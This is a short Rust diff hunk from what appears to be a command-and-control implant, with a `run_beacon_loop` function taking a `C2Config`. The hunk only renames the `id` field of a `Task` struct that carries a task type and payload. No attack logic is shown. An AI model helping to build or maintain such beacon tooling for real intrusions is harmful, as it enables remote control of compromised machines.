@@ -639,8 +639,8 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
 
 #[derive(Deserialize)]
 struct Task {
-    #[allow(dead_code)]
-    id: alloc::string::String,
+    #[serde(rename = "id")]
+    _id: alloc::string::String,
     #[serde(rename = "type_")]
     task_type: alloc::string::String,
     payload: alloc::string::String,
